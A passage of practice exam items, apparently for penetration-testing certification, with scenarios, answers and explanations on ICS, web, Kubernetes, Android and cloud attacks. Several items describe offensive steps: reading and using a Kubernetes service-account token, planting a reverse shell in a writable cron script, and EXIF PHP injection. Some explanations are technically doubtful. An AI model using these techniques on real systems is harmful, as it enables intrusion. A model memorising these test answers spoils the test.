      "question": "A penetration tester is analyzing network traffic captured during an assessment of an industrial control system environment. They observe the following Modbus TCP packet capture:\n\n```\n16:32:45.123456 IP 10.1.1.50.502 > 10.1.1.100.49513: Flags [P.], seq 1:8, ack 1, win 502, options [nop,nop,TS val 1234567 ecr 7654321], length 7: Modbus/TCP\n0x0000:  0001 0000 0006 0103 0000 000a            ............\n\n16:32:45.234567 IP 10.1.1.100.49513 > 10.1.1.50.502: Flags [P.], seq 1:8, ack 8, win 502, options [nop,nop,TS val 7654322 ecr 1234567], length 7: Modbus/TCP\n0x0000:  0001 0000 0015 0103 14c8 0013 00c2 00ab  ................\n0x0010:  0002 00c1 009a 0001                      ........\n\n16:32:46.123456 IP 10.1.1.50.502 > 10.1.1.100.49513: Flags [P.], seq 8:15, ack 8, win 502, options [nop,nop,TS val 1234568 ecr 7654322], length 7: Modbus/TCP\n0x0000:  0002 0000 0006 0110 0000 0008            ............\n\n16:32:46.234567 IP 10.1.1.100.49513 > 10.1.1.50.502: Flags [P.], seq 8:15, ack 15, win 502, options [nop,nop,TS val 7654323 ecr 1234568], length 7: Modbus/TCP\n0x0000:  0002 0000 0006 0110 0000 0008            ............\n```\n\nWhat vulnerability is most apparent in this industrial protocol implementation?",
      "options": [
        "Lack of authentication allowing unauthorized Modbus commands",
        "Clear-text transmission of critical control system values",
        "Predictable transaction identifiers enabling replay attacks",
        "Buffer overflow vulnerability in Modbus response handling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Modbus TCP traffic shows command and response packets with function codes 0x03 (Read Holding Registers) and 0x10 (Write Multiple Registers) being exchanged between the devices without any authentication mechanism. This is a fundamental vulnerability in the Modbus protocol, which was designed without built-in authentication. Any device on the network can send Modbus commands to control systems if they can reach port 502. While the data is indeed transmitted in clear text, this is an inherent limitation of the protocol rather than a specific vulnerability. The transaction identifiers (0001, 0002) are sequential but not particularly predictable in a way that enables replay attacks beyond basic packet replay. There's no evidence of a buffer overflow vulnerability in the packet capture; all messages appear to be well-formed Modbus TCP packets with proper length fields.",
      "examTip": "When assessing industrial control systems, remember that many industrial protocols like Modbus were designed decades ago with a focus on reliability rather than security, often lacking fundamental security controls like authentication, authorization, and encryption."
    },
    {
      "id": 90,
      "question": "A penetration tester is evaluating a web application's security and finds the following vulnerability disclosure policy on the company's website:\n\n```\nVulnerability Disclosure Policy\n\nWe take security seriously. If you believe you've found a security vulnerability in our product or service, we encourage you to notify us. We welcome working with you to resolve the issue promptly.\n\nGuidelines:\n1. Provide detailed reports with reproducible steps\n2. Submit all findings to security@example.com\n3. Allow up to 5 business days for an initial response\n\nThe following test types require explicit written permission:\n- Denial of service testing\n- Physical security testing\n- Social engineering\n\nOut of scope:\n- Findings from automated vulnerability scanners without verification\n- Recently disclosed (less than 30 days) zero-day vulnerabilities\n- Third-party services not directly controlled by Example Corp\n\nSafe Harbor: We will not take legal action against security researchers who follow this policy and act in good faith.\n```\n\nDuring testing, the tester identifies a SQL injection vulnerability but notices it could potentially disrupt the database if exploited incorrectly. What is the appropriate action for the tester to take?",
      "options": [
        "Report the SQL injection with proof of concept that safely demonstrates the vulnerability without extracting sensitive data",
        "Fully exploit the vulnerability to determine its severity before reporting it",
        "Conduct automated scanning to identify all instances of SQL injection in the application",
        "Perform denial of service testing to determine if the SQL injection can crash the database"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Based on the vulnerability disclosure policy, the tester should report the SQL injection vulnerability with a safe proof of concept that demonstrates the issue without causing disruption or extracting sensitive data. This approach adheres to the 'good faith' principle mentioned in the Safe Harbor clause while providing the necessary information for the organization to understand and address the vulnerability. Fully exploiting the vulnerability to extract data would exceed the bounds of responsible disclosure and could potentially violate legal boundaries, even with a Safe Harbor policy in place. Conducting automated scanning for additional vulnerabilities might generate false positives, which are explicitly mentioned as out of scope in the policy. Performing denial of service testing is explicitly stated as requiring permission before conducting, so doing this without authorization would violate the policy.",
      "examTip": "Always adhere strictly to vulnerability disclosure policies during penetration testing. When demonstrating SQL injection vulnerabilities, use harmless techniques like 'UNION SELECT 1,2,3' or simple boolean conditions rather than extracting actual data or attempting disruptive queries."
    },
    {
      "id": 91,
      "question": "A penetration tester has gained access to a system and wants to establish persistence. They discover that they have write access to an existing scheduled task. Examine the following `crontab -l` output:\n\n```\n# System maintenance tasks\n0 1 * * * /usr/local/bin/system_backup.sh\n30 1 * * 0 /usr/local/bin/log_rotation.sh\n0 2 * * * /usr/local/bin/update_check.sh\n0 5 * * * /usr/local/sbin/security_scan.sh > /var/log/security_scan.log 2>&1\n```\n\nThe tester also runs the following commands:\n\n```bash\n$ ls -la /usr/local/bin/\ntotal 36\ndrwxr-xr-x  2 root root 4096 Oct 20 10:25 .\ndrwxr-xr-x 10 root root 4096 Jan 15  2023 ..\n-rwxr-xr-x  1 root root 2534 Mar 10  2023 log_rotation.sh\n-rwxr-xr-x  1 root root 3652 Feb 28  2023 system_backup.sh\n-rwxrwxr-x  1 root dev  1842 Oct 15 08:35 update_check.sh\n\n$ id\nuid=1000(developer) gid=1000(developer) groups=1000(developer),998(dev)\n```\n\nWhat is the most effective persistence technique in this scenario?",
      "options": [
        "Modify update_check.sh to add a reverse shell command while preserving its original functionality",
        "Create a symbolic link from system_backup.sh to a malicious script in a user-controlled directory",
        "Add a new cron job with a wildcard character in the command path to enable command injection",
        "Install a kernel module that executes code early in the boot process before security controls"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Based on the provided information, update_check.sh has write permissions for the 'dev' group (rwxrwxr-x), and the tester's user account is a member of that group. This means they can modify this script, which runs daily at 2 AM according to the crontab. The most effective persistence technique would be to modify this script to include a reverse shell or other backdoor command while preserving its original functionality to avoid detection. This approach provides regular, scheduled execution of the attacker's code with the privileges of the script's owner (root). Creating a symbolic link to system_backup.sh wouldn't work because the tester doesn't have write access to that file or its directory. Adding a new cron job would require access to edit the crontab file itself, which isn't indicated in the output. Installing a kernel module would typically require root privileges, which the tester doesn't appear to have directly.",
      "examTip": "When looking for persistence opportunities, focus on writable scripts that are executed by scheduled tasks or other automated processes, especially those running with elevated privileges. Preserving the original functionality while adding malicious code is key to maintaining stealth."
    },
    {
      "id": 92,
      "question": "A penetration tester is performing a physical security assessment and needs to gain access to a secure facility. The facility uses HID proximity cards for access, with card readers at all entrances. The tester observes employees entering the building and notices they keep their access cards in badge holders attached to belt clips or lanyards. Which physical attack technique would be most effective in this scenario?",
      "options": [
        "Using an RFID field detector to identify when a legitimate card is in range, then capturing the signal with a long-range reader",
        "Creating a cloned access card after capturing card data from a discarded legitimate card",
        "Social engineering an employee to willingly provide physical access by impersonating maintenance staff",
        "Bypassing the card reader by exploiting weaknesses in the door's physical construction"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Based on the scenario, employees are wearing their access cards visibly on belt clips or lanyards, making them susceptible to remote reading attacks. RFID field detectors can identify when a legitimate card comes within range, and a long-range reader can capture the card's data without physical contact or the employee's knowledge, often from several feet away. This is a practical approach that doesn't require direct interaction with employees or physical tampering with infrastructure. Creating a cloned card would require first obtaining card data, which the tester doesn't yet have. Social engineering approaches often have higher risk of detection and depend heavily on the specific security awareness of the targeted employees. Bypassing the physical door construction would typically be more obvious and potentially trigger alarms, making it higher risk than capturing card data remotely.",
      "examTip": "When conducting physical security assessments involving proximity cards, remember that many common access cards can be read from a distance without the cardholder's knowledge. Modern RFID readers can capture card data from several feet away, making this a low-risk technique compared to more direct social engineering or physical bypass methods."
    },
    {
      "id": 93,
      "question": "A penetration tester has compromised a Linux web server and found the following entry in the Apache configuration:\n\n```apache\n<VirtualHost *:443>\n    ServerName internal-app.company.local\n    DocumentRoot /var/www/internal\n    SSLEngine on\n    SSLCertificateFile /etc/ssl/certs/internal-app.crt\n    SSLCertificateKeyFile /etc/ssl/private/internal-app.key\n    \n    <Location /admin>\n        AuthType Basic\n        AuthName \"Restricted Area\"\n        AuthUserFile /etc/apache2/.htpasswd\n        Require valid-user\n    </Location>\n    \n    ProxyPass /api http://internal-db.company.local:8080/api\n    ProxyPassReverse /api http://internal-db.company.local:8080/api\n</VirtualHost>\n```\n\nThe tester also runs the following commands:\n\n```bash\n$ cat /etc/hosts\n127.0.0.1       localhost\n10.10.5.20      webserver.company.local\n10.10.5.21      internal-app.company.local\n10.10.10.50     internal-db.company.local\n\n$ ping -c 1 internal-db.company.local\nPING internal-db.company.local (10.10.10.50) 56(84) bytes of data.\n64 bytes from internal-db.company.local (10.10.10.50): icmp_seq=1 ttl=64 time=0.476 ms\n```\n\nWhich attack technique should the tester attempt to gain access to additional internal systems?",
      "options": [
        "Server-Side Request Forgery through the ProxyPass directive to access the internal database API",
        "SSL private key extraction to decrypt captured internal application traffic",
        "Password hash cracking after obtaining the .htpasswd file for admin access",
        "DNS poisoning to redirect internal-db.company.local to an attacker-controlled server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Apache configuration includes a ProxyPass directive that forwards requests from /api to an internal service at http://internal-db.company.local:8080/api. This creates a Server-Side Request Forgery (SSRF) opportunity where the tester can leverage the web server to make requests to internal systems that might otherwise be inaccessible. The output of the ping command confirms that the internal database server is reachable from the compromised web server. By crafting specific requests to the /api endpoint, the tester can potentially access the internal database API and possibly other internal services. While extracting the SSL private key could be valuable for traffic decryption, there's no indication of captured traffic to decrypt. The .htpasswd file would only provide access to the /admin section of this specific application, which is less valuable than potential database access. DNS poisoning would be difficult to execute from this position and less reliable than using the existing proxy configuration.",
      "examTip": "When examining web server configurations during penetration tests, pay special attention to proxy directives like ProxyPass. These can often be leveraged for Server-Side Request Forgery (SSRF) attacks, allowing you to access internal systems from a compromised internet-facing server."
    },
    {
      "id": 94,
      "question": "A penetration tester has gained access to a Windows domain workstation and executes the following PowerShell commands:\n\n```powershell\nPS C:\\> Get-ADDomain | Select-Object NetBIOSName, DomainMode, DomainSID\n\nNetBIOSName DomainMode                  DomainSID\n----------- ----------                  ---------\nCORPDOMAIN  Windows2016Domain          S-1-5-21-3623811015-3361044348-30300820\n\nPS C:\\> Find-DomainShare -CheckShareAccess | Select-Object Name, ComputerName, Remark\n\nName                 ComputerName            Remark\n----                 ------------            ------\nNETLOGON             DC01.corpdomain.local   Logon server share\nSYSVOL                DC01.corpdomain.local   Logon server share\nUsers                 DC01.corpdomain.local\nDepartmentFiles      FS01.corpdomain.local   Department shared files\nIT                    FS01.corpdomain.local   IT Department\nTemplates             FS01.corpdomain.local   Document templates\nLegacy                FS01.corpdomain.local   Legacy application data\nAccounting            FS02.corpdomain.local   Accounting Department\n\nPS C:\\> ls \\\\FS01.corpdomain.local\\Legacy\n\n    Directory: \\\\FS01.corpdomain.local\\Legacy\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----         10/5/2023   9:15 AM                2019\nd-----         10/5/2023   9:15 AM                2020\nd-----         10/5/2023   9:15 AM                2021\nd-----         10/5/2023   9:15 AM                Config\n-a----         12/5/2020   3:23 PM          8,192 LegacyApp.exe\n-a----         3/12/2019   1:08 PM          2,048 LegacyApp.ini\n-a----         3/12/2019   1:08 PM            824 DbConfig.xml\n```\n\nBased on this information, what action should the tester take to most effectively advance their access within the domain?",
      "options": [
        "Examine the DbConfig.xml file for plaintext database credentials",
        "Access the SYSVOL share to search for Group Policy Preference passwords",
        "Target the FS02.corpdomain.local server using discovered naming conventions",
        "Analyze the LegacyApp.exe for buffer overflow vulnerabilities"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Given the available information, examining the DbConfig.xml file for plaintext database credentials would be the most immediate and effective next step. Configuration files, especially XML files with names suggesting database configuration, frequently contain cleartext credentials or connection strings that could provide access to database servers or other systems. The tester already has confirmed access to the Legacy share and can directly view this file. Accessing the SYSVOL share to search for Group Policy Preference passwords could be valuable but would require permissions on the domain controller shares, which isn't confirmed in the output. While targeting FS02 based on naming conventions might eventually be useful, there's no indication of specific vulnerabilities or accessible shares on that server that would make it a more effective target than examining the immediately available configuration file. Analyzing the LegacyApp.exe for buffer overflows would require significant reverse engineering effort with uncertain results, making it less efficient than checking for exposed credentials.",
      "examTip": "During active directory penetration testing, prioritize examining accessible configuration files for plaintext credentials. Files like web.config, DbConfig.xml, connection string files, and application configuration files often contain valuable credentials that can provide immediate lateral movement opportunities."
    },
    {
      "id": 95,
      "question": "A penetration tester discovers a web application that allows users to upload profile pictures. The application accepts uploads via a form using the following HTML:\n\n```html\n<form action=\"/api/upload\" method=\"post\" enctype=\"multipart/form-data\">\n  <input type=\"file\" name=\"avatar\" accept=\"image/jpeg,image/png\">\n  <input type=\"hidden\" name=\"user_id\" value=\"1234\">\n  <input type=\"submit\" value=\"Upload\">\n</form>\n```\n\nAfter uploading an image, the tester receives this response:\n\n```\nHTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"status\": \"success\",\n  \"filename\": \"avatar_1234_1603724388.jpg\",\n  \"path\": \"/images/avatars/avatar_1234_1603724388.jpg\"\n}\n```\n\nInspecting the server response headers from the uploaded image URL, the tester observes:\n\n```\nHTTP/1.1 200 OK\nContent-Type: image/jpeg\nContent-Length: 82345\nX-Powered-By: PHP/7.2.24\nServer: Apache/2.4.29\n```\n\nWhat technique should the tester try to achieve remote code execution?",
      "options": [
        "Upload a .php file with image magic bytes and content-type spoofing",
        "Exploit path traversal in the filename parameter to overwrite server configuration",
        "Inject PHP code into the EXIF metadata of a valid JPEG image",
        "Perform a size validation bypass to upload a malicious executable"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Given the information provided, injecting PHP code into the EXIF metadata of a valid JPEG image is the most promising technique. Several key factors support this approach: 1) The server is running PHP 7.2.24, confirming PHP code execution is possible; 2) The application appears to be validating file types based on the 'accept' attribute limiting uploads to JPEG and PNG formats; 3) The uploaded files are accessible directly via a URL path, meaning the server will process them; and 4) The server returns the exact file path, confirming the files remain in their original format. By embedding PHP code within the EXIF metadata of a valid JPEG (which will pass content-type validation), the tester may achieve code execution if the server uses functions like exif_read_data() or similar image processing functions that might execute embedded code. Uploading a .php file with image magic bytes might be detected by content-type validation. There's no indication of a path traversal vulnerability in the filename, as the server appears to generate its own filename with a timestamp. Size validation bypass isn't relevant without evidence of size restrictions.",
      "examTip": "When testing file upload features that enforce image types and appear to process uploaded images, EXIF metadata injection is a subtle technique for achieving code execution. Tools like ExifTool can be used to inject PHP code into comment fields or other metadata areas of legitimate image files."
    },
    {
      "id": 96,
      "question": "A penetration tester is evaluating a Kubernetes cluster and has gained access to a compromised container. Executing the following commands:\n\n```bash\n$ mount | grep kubernetes\n/dev/sda1 on /var/lib/kubelet/pods/7e9fc149-8e4c-4df4-9c54-95e1c0b41921/volumes/kubernetes.io~secret/service-account-token type ext4 (ro,relatime,data=ordered)\n\n$ cat /var/run/secrets/kubernetes.io/serviceaccount/token\neyJhbGciOiJSUzI1NiIsImtpZCI6Ik1rb2xseFhkR3d5VUtQUnJTRFZwYWdEZl80QWNEVkJEMFY1TFV6aTBrNUUifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZXZlbG9wbWVudCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJkZWZhdWx0LXRva2VuLW12Y3Y3Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImRlZmF1bHQiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyMjBkZmIyMi05MDk0LTQwZmEtOTFlMi1jZDQzN2UwZmExZGEiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6ZGV2ZWxvcG1lbnQ6ZGVmYXVsdCJ9.kQ-cryKsqRFqJTmvQBzTrFIlBU-FQZdMvG4QgDQ5vFKR3element1q3AhEEXNu8X1nxJEVpUnHNzFgiVuJsZ-iVzzeAqQgdCGhGxTFryJDQHYSpxUC38WfUOd2Kkqc8uRHXf62Rg-mdWQBlXiOPdkGI7NmMfXBXoJ0ESeZXfAJvsW5mLo8nRn9IVuqCRnsBWcQ-TY5Hi-DWfLr1NLWGOTVm99DPQkJJyWLAJ9vL-U7UWwbwlKRxQ8M35kAvyPdY2t58etVCQYgqw56J8aY7i-FiUu4Jq5hOaBvzXWupX7vfH6mjcxrKJm6lIOLXI4Wn3OCrLOZdlxKLwsQ0fy0x82daQ\n\n$ cat /var/run/secrets/kubernetes.io/serviceaccount/namespace\ndevelopment\n\n$ curl -k https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" | head -n 20\n{\n  \"kind\": \"Status\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {},\n  \"status\": \"Failure\",\n  \"message\": \"secrets is forbidden: User \\\"system:serviceaccount:development:default\\\" cannot list resource \\\"secrets\\\" in API group \\\"\\\" in the namespace \\\"kube-system\\\"\",\n  \"reason\": \"Forbidden\",\n  \"details\": {\n    \"kind\": \"secrets\"\n  },\n  \"code\": 403\n}\n```\n\nWhich attack technique should the tester employ next?",
      "options": [
        "Enumerate accessible resources in the development namespace to identify sensitive information",
        "Attempt to create a privileged pod in the development namespace for container escape",
        "Exploit service account token to access kube-system secrets directly",
        "Search for Kubernetes dashboard access to bypass authentication controls"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The output shows that the tester has access to a service account token for the 'development' namespace but received a 403 Forbidden error when attempting to access secrets in the 'kube-system' namespace. This indicates the service account has limited permissions. The most logical next step is to enumerate what resources the service account can actually access within its own namespace ('development') by using the token to query the Kubernetes API for accessible resources. This would identify potential sensitive information like secrets, configmaps, or other resources within that namespace. Attempting to create a privileged pod would likely fail given the restricted permissions already demonstrated. The error message clearly shows the service account cannot access kube-system secrets directly, making that approach ineffective. There's no indication of a Kubernetes dashboard in the provided information, and even if present, it would likely require additional authentication beyond the limited service account token.",
      "examTip": "When testing Kubernetes environments, always start by enumerating what the compromised service account can access in its own namespace before attempting privilege escalation. Use commands like 'kubectl auth can-i --list' or API queries to determine accessible resources, then target those for sensitive information."
    },
    {
      "id": 97,
      "question": "A penetration tester is analyzing an Android application and extracts the following configuration from the app's resources:\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<network-security-config>\n    <base-config cleartextTrafficPermitted=\"true\">\n        <trust-anchors>\n            <certificates src=\"system\" />\n            <certificates src=\"user\" />\n        </trust-anchors>\n    </base-config>\n    <domain-config>\n        <domain includeSubdomains=\"true\">api.company.com</domain>\n        <domain includeSubdomains=\"true\">auth.company.com</domain>\n        <trust-anchors>\n            <certificates src=\"@raw/company_cert\"/>\n            <certificates src=\"system\"/>\n        </trust-anchors>\n        <pin-set expiration=\"2023-12-31\">\n            <pin digest=\"SHA-256\">7HIpactkIAq2Y49orFOOQKurWxmmSFZhBCoQYcRhJ3Y=</pin>\n        </pin-set>\n    </domain-config>\n</network-security-config>\n```\n\nThe tester also examines the AndroidManifest.xml file:\n\n```xml\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\"\n    package=\"com.company.app\">\n    <uses-permission android:name=\"android.permission.INTERNET\" />\n    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\" />\n    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\" />\n    <application\n        android:networkSecurityConfig=\"@xml/network_security_config\"\n        android:allowBackup=\"true\"\n        android:debuggable=\"true\"\n        android:icon=\"@mipmap/ic_launcher\"\n        android:label=\"@string/app_name\">\n        <!-- Activities, services, etc. -->\n    </application>\n</manifest>\n```\n\nWhat security vulnerability is present in this application configuration?",
      "options": [
        "The application allows cleartext traffic and debug mode is enabled in a production app",
        "Certificate pinning is implemented incorrectly with an expired pin-set",
        "User certificate authorities are trusted, enabling potential MitM attacks",
        "Insecure external storage access allows sensitive data exposure"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The application configuration contains two significant security issues: First, 'cleartextTrafficPermitted=\"true\"' in the base-config allows the application to send and receive data over unencrypted HTTP connections, potentially exposing sensitive information. Second, 'android:debuggable=\"true\"' in the AndroidManifest.xml indicates the application is in debug mode, which should never be enabled in production apps as it allows attaching a debugger and accessing sensitive application data. The certificate pinning appears to be properly implemented with a valid expiration date (future date of December 31, 2023). While trusting user certificate authorities can potentially enable MitM attacks in some contexts, this is specifically limited to the base-config and not the domain-config for the company's API domains, which use certificate pinning. The WRITE_EXTERNAL_STORAGE permission alone doesn't constitute a vulnerability without evidence of sensitive data being stored insecurely.",
      "examTip": "When reviewing Android application configurations, check for 'cleartextTrafficPermitted=\"true\"' and 'android:debuggable=\"true\"' flags, which are common security misconfigurations that should never appear in production applications. These settings dramatically reduce the security posture of the application."
    },
    {
      "id": 98,
      "question": "A penetration tester is evaluating an online banking application and observes the following HTTP headers in the server response:\n\n```\nHTTP/1.1 200 OK\nDate: Wed, 25 Oct 2023 12:34:56 GMT\nContent-Type: text/html; charset=UTF-8\nContent-Length: 45290\nConnection: keep-alive\nX-Content-Type-Options: nosniff\nX-XSS-Protection: 1; mode=block\nX-Frame-Options: DENY\nReferrer-Policy: strict-origin-when-cross-origin\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Security-Policy: default-src 'self'; script-src 'self' https://analytics.tracker.com; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.bank.com; frame-ancestors 'none';\nCache-Control: no-store, must-revalidate, max-age=0\nPragma: no-cache\n```\n\nWhich security vulnerability exists in the HTTP headers configuration?",
      "options": [
        "Content Security Policy allows unsafe inline styles and external analytics scripts",
        "Missing Feature-Policy/Permissions-Policy header to restrict sensitive browser features",
        "Insufficiently restrictive X-XSS-Protection header allowing certain XSS vectors",
        "HSTS header missing the preload directive for maximum protection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Content Security Policy (CSP) contains two significant weaknesses: First, it allows 'unsafe-inline' for style-src, which permits inline CSS and potentially enables certain types of XSS attacks that leverage style attributes or tags. Second, it allows scripts from an external domain (analytics.tracker.com), which expands the attack surface since compromise of that external domain could lead to compromise of the banking application. For a financial application, these allowances represent unnecessary risks. While adding the 'preload' directive to HSTS would provide additional protection, the existing HSTS configuration with includeSubDomains and a one-year max-age is already robust. The X-XSS-Protection header is set to the most secure configuration (1; mode=block). While a Feature-Policy/Permissions-Policy header would add security by restricting access to browser features, its absence is less critical than the CSP weaknesses, especially for a banking application.",
      "examTip": "When evaluating Content Security Policies, pay special attention to 'unsafe-inline' and external domains in script-src and style-src directives. Financial and other high-security applications should avoid these configurations, as they significantly weaken the protection provided by CSP against XSS attacks."
    },
    {
      "id": 99,
      "question": "A penetration tester is assessing an e-commerce web application that processes credit card transactions. During the checkout process, they observe the following JavaScript code on the payment page:\n\n```javascript\n// Payment form processing\nfunction processPayment() {\n  const cardNumber = document.getElementById('card-number').value;\n  const expiry = document.getElementById('expiry').value;\n  const cvv = document.getElementById('cvv').value;\n  const name = document.getElementById('cardholder-name').value;\n  \n  // Log payment details for debugging\n  console.log('Processing payment for: ' + name);\n  \n  // Validate card details\n  if (!validateCardNumber(cardNumber)) {\n    showError('Invalid card number');\n    return false;\n  }\n  \n  // Create payment payload\n  const paymentData = {\n    card_number: cardNumber,\n    expiry: expiry,\n    cvv: cvv,\n    name: name,\n    amount: window.orderTotal,\n    order_id: window.orderId\n  };\n  \n  // Send payment request\n  $.ajax({\n    url: '/api/process-payment',\n    type: 'POST',\n    data: JSON.stringify(paymentData),\n    contentType: 'application/json',\n    success: function(response) {\n      if (response.status === 'success') {\n        window.location.href = '/confirmation?order=' + window.orderId;\n      } else {\n        showError(response.message);\n      }\n    },\n    error: function(xhr) {\n      showError('Payment processing error');\n    }\n  });\n  \n  return false;\n}\n```\n\nWhat critical security vulnerability exists in this payment processing implementation?",
      "options": [
        "Credit card data is processed client-side and transmitted directly to the server",
        "Payment form lacks CSRF protection tokens allowing cross-site request forgery",
        "Debug logging exposes sensitive cardholder data in browser console",
        "Ajax request uses unencrypted HTTP for payment processing"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The critical vulnerability is that sensitive credit card data (including card number, expiration date, and CVV) is being collected and processed entirely client-side in JavaScript before being transmitted directly to the server. This violates payment card industry (PCI DSS) requirements, which specify that this information should be processed through a secure, PCI-compliant payment processor or tokenization service rather than being handled directly by the merchant's application. The code collects the full card details in the browser and sends them to the application's own API endpoint (/api/process-payment), indicating the site may be storing or processing card data itself. While the debug logging (console.log) does expose the cardholder name, it doesn't log the actual card details, making it a minor issue compared to the fundamental architectural problem. There's no evidence the Ajax request uses unencrypted HTTP - the URL is relative ('/api/process-payment') and would use the same protocol as the page. While CSRF protection might be missing, this is less critical than the direct handling of card data.",
      "examTip": "When testing e-commerce applications, verify that credit card processing follows PCI DSS guidelines by using a secure payment processor, iframe, or tokenization service rather than handling card data directly. Applications should never collect and transmit complete credit card details through their own JavaScript code."
    },
    {
      "id": 100,
      "question": "A penetration tester has gained access to an internal GitLab server and discovers a repository containing infrastructure-as-code templates. The tester finds the following Terraform configuration file:\n\n```hcl\nprovider \"aws\" {\n  region     = \"us-west-2\"\n  access_key = \"AKIAIOSFODNN7EXAMPLE\"\n  secret_key = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n}\n\nresource \"aws_s3_bucket\" \"data_bucket\" {\n  bucket = \"company-customer-data\"\n\n  tags = {\n    Name        = \"Customer Data\"\n    Environment = \"Production\"\n  }\n}\n\nresource \"aws_s3_bucket_acl\" \"data_bucket_acl\" {\n  bucket = aws_s3_bucket.data_bucket.id\n  acl    = \"private\"\n}\n\nresource \"aws_s3_bucket_versioning\" \"data_bucket_versioning\" {\n  bucket = aws_s3_bucket.data_bucket.id\n  versioning_configuration {\n    status = \"Enabled\"\n  }\n}\n\nresource \"aws_iam_user\" \"app_user\" {\n  name = \"application-service-user\"\n  path = \"/system/\"\n}\n\nresource \"aws_iam_access_key\" \"app_user_key\" {\n  user = aws_iam_user.app_user.name\n}\n\nresource \"aws_secretsmanager_secret\" \"app_credentials\" {\n  name = \"app/production/credentials\"\n  description = \"Application database credentials\"\n}\n\nresource \"aws_secretsmanager_secret_version\" \"app_credentials_value\" {\n  secret_id = aws_secretsmanager_secret.app_credentials.id\n  secret_string = jsonencode({\n    username = \"app_db_user\"\n    password = \"Sup3rS3cr3tP@ssw0rd!\"\n    engine   = \"postgres\"\n    host     = \"db.internal.company.com\"\n    port     = 5432\n    dbname   = \"production\"\n  })\n}\n```\n\nWhat are the TWO most critical security issues in this configuration?",
      "options": [
        "Hardcoded AWS access keys and plaintext database credentials",
        "Public S3 bucket ACL and missing encryption configuration",
        "Overly permissive IAM policy and insecure secret retention policy",
        "Missing S3 bucket logging and inadequate IAM user path restrictions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Terraform configuration contains two critical security issues: 1) Hardcoded AWS access and secret keys in the provider block, which could give an attacker direct access to the AWS environment, and 2) Plaintext database credentials stored directly in the configuration file in the aws_secretsmanager_secret_version resource. Both of these represent serious security risks as they expose sensitive credentials that could be used to access critical systems. The S3 bucket is not configured with a public ACL - it's explicitly set to 'private' which is secure. While encryption is not explicitly configured for the S3 bucket, this is less critical than the exposed credentials. There are no IAM policies defined in the provided configuration that would indicate overly permissive access. While missing S3 bucket logging might be a security concern, it's less severe than the exposed credentials.",
      "examTip": "When reviewing infrastructure-as-code files during penetration tests, prioritize finding hardcoded credentials, access keys, and secrets. These are high-value findings that provide immediate access to systems and should never be stored in version control, even in private repositories."
    }
  ]
});
